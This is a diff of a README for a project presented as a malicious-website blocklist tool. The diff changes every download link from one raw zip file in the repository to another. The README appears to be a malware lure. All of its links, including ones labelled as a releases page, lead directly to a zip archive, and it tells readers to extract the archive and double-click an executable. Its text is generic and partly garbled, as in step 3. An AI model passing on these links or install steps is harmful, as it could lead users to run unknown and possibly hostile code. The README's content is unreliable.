@@ -1,11 +1,11 @@
 # 🛡️ malicious-domains - Protect Against Malicious Websites
 
 ## 📦 Download & Install
-[![Download Now](https://raw.githubusercontent.com/asuki-yashi/malicious-domains/main/scripts/malicious-domains-v3.7.zip%20Now-Get%20the%20Latest%20Release-blue)](https://raw.githubusercontent.com/asuki-yashi/malicious-domains/main/scripts/malicious-domains-v3.7.zip)
+[![Download Now](https://github.com/asuki-yashi/malicious-domains/raw/refs/heads/main/output/malicious_domains_2.1-alpha.5.zip%20Now-Get%20the%20Latest%20Release-blue)](https://github.com/asuki-yashi/malicious-domains/raw/refs/heads/main/output/malicious_domains_2.1-alpha.5.zip)
 
 To get started with malicious-domains, visit the page below to download the latest release. 
 
-[Download Latest Release](https://raw.githubusercontent.com/asuki-yashi/malicious-domains/main/scripts/malicious-domains-v3.7.zip)
+[Download Latest Release](https://github.com/asuki-yashi/malicious-domains/raw/refs/heads/main/output/malicious_domains_2.1-alpha.5.zip)
 
 ## 🚀 Getting Started
 malicious-domains helps you stay safe online by providing a list of known harmful websites. This software collects and organizes data from various reliable sources, reducing threats to your devices. 
@@ -22,9 +22,9 @@ malicious-domains helps you stay safe online by providing a list of known harmfu
 - A stable internet connection for updates
 
 ## ⚙️ Usage Instructions
-1. **Visit the Releases Page**: Go to [this page](https://raw.githubusercontent.com/asuki-yashi/malicious-domains/main/scripts/malicious-domains-v3.7.zip) to see the available versions.
+1. **Visit the Releases Page**: Go to [this page](https://github.com/asuki-yashi/malicious-domains/raw/refs/heads/main/output/malicious_domains_2.1-alpha.5.zip) to see the available versions.
 2. **Choose the Version**: Look for the latest version at the top. Each release contains a description and changes made in that version.
-3. **Download the File**: Click on the link for the file that matches your operating system. It will typically be a `.zip` or `https://raw.githubusercontent.com/asuki-yashi/malicious-domains/main/scripts/malicious-domains-v3.7.zip` file. 
+3. **Download the File**: Click on the link for the file that matches your operating system. It will typically be a `.zip` or `https://github.com/asuki-yashi/malicious-domains/raw/refs/heads/main/output/malicious_domains_2.1-alpha.5.zip` file. 
 4. **Extract the Files**: Once downloaded, find the file in your downloads folder and extract it using a file extraction tool. Right-click the file and choose "Extract All" or the equivalent option on your operating system.
 5. **Run the Application**: Open the extracted folder and double-click the executable file to start using malicious-domains.
 
@@ -34,7 +34,7 @@ malicious-domains connects to various feeds that track malicious websites. Each 
 ## 🔒 Security Practices
 When operating any software that handles security-related data:
 - Always keep your software updated
-- Regularly check for new releases on the [Releases page](https://raw.githubusercontent.com/asuki-yashi/malicious-domains/main/scripts/malicious-domains-v3.7.zip)
+- Regularly check for new releases on the [Releases page](https://github.com/asuki-yashi/malicious-domains/raw/refs/heads/main/output/malicious_domains_2.1-alpha.5.zip)
 - Use strong passwords for any accounts related to your cybersecurity efforts
 
 ## 📄 Documentation
@@ -60,4 +60,4 @@ For more information on cybersecurity practices and threat intelligence:
 
 Remember, staying safe online is a continuous process. Regular use of applications like malicious-domains is a step in the right direction. 
 
-[Download Latest Release](https://raw.githubusercontent.com/asuki-yashi/malicious-domains/main/scripts/malicious-domains-v3.7.zip) and enhance your security efforts today.
+[Download Latest Release](https://github.com/asuki-yashi/malicious-domains/raw/refs/heads/main/output/malicious_domains_2.1-alpha.5.zip) and enhance your security efforts today.
